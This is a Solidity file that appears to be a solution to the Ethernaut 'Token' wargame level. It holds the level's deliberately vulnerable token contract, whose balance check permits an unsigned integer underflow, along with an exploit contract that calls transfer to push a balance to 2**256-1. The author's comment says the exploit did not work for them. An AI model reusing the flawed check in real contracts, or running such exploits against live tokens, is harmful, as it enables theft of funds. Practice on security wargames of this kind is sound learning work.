pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

//BUG?: Might be a bug in the level on ethernaut. The below should work but does not for me currently using compiler =< 0.4.25. Also is showing a balance of 0 for me when it should be instantiated with a balance of 20.

contract TokenExploit {
    Token tokenContract;
    
    //Token instance address in Token( HERE )
    function findTokenContract() public {
        tokenContract = Token(0x0fA0f9D02b6d6E8921d3901F8225A734e613A6d0);
    }
    
    //Expoits arithmetic underflow opportunity in line 13, 0 - 1 = 2**256 - 1
    //Set balance to 0 (can do this any way but here it sends to the Token contract instance) then call transfer again to underflow
    function clearBalance() public {
        uint balanceToClear = tokenContract.balanceOf(0x7B69Cf3D6A03C3cA6Ac5B9a620b6a07981c5E56F);
        tokenContract.transfer(address(tokenContract), balanceToClear);
    }
    
    //Second call to transfer should not use your own address as this will underflow the balance of msg.sender if balance=0 but will reoverflow it if msg.sender=_to
    function ExploitTokenContractUnderflow() public {
        tokenContract.transfer(address(tokenContract), 1);
    }
    
}
